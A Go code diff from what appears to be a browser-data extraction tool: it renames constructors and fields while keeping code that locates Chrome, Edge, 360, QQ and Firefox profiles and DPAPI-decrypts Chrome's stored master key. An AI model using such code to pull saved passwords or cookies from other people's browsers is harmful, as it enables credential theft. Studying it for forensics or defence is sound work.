@@ -34,28 +34,28 @@ var (
 			ProfilePath: os.Getenv("USERPROFILE") + chromeProfilePath,
 			KeyPath:     os.Getenv("USERPROFILE") + chromeKeyPath,
 			Name:        chromeName,
-			New:         decryptChromium,
+			New:         NewChromium,
 		},
 		"edge": {
 			ProfilePath: os.Getenv("USERPROFILE") + edgeProfilePath,
 			KeyPath:     os.Getenv("USERPROFILE") + edgeKeyPath,
 			Name:        edgeName,
-			New:         decryptChromium,
+			New:         NewChromium,
 		},
 		"360": {
 			ProfilePath: os.Getenv("USERPROFILE") + speed360ProfilePath,
 			Name:        speed360Name,
-			New:         decryptChromium,
+			New:         NewChromium,
 		},
 		"qq": {
 			ProfilePath: os.Getenv("USERPROFILE") + qqBrowserProfilePath,
 			Name:        qqBrowserName,
-			New:         decryptChromium,
+			New:         NewChromium,
 		},
 		"firefox": {
 			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
 			Name:        firefoxName,
-			New:         decryptFirefox,
+			New:         NewFirefox,
 		},
 	}
 )
@@ -64,11 +64,11 @@ var (
 	errBase64DecodeFailed = errors.New("decode base64 failed")
 )
 
-func (c *chromium) InitSecretKey() error {
-	if c.KeyPath == "" {
+func (c *Chromium) InitSecretKey() error {
+	if c.keyPath == "" {
 		return nil
 	}
-	keyFile, err := utils.ReadFile(c.KeyPath)
+	keyFile, err := utils.ReadFile(c.keyPath)
 	if err != nil {
 		return err
 	}
@@ -78,7 +78,7 @@ func (c *chromium) InitSecretKey() error {
 		if err != nil {
 			return errBase64DecodeFailed
 		}
-		c.SecretKey, err = decrypt.DPApi(pureKey[5:])
+		c.secretKey, err = decrypt.DPApi(pureKey[5:])
 		return err
 	}
 	return nil
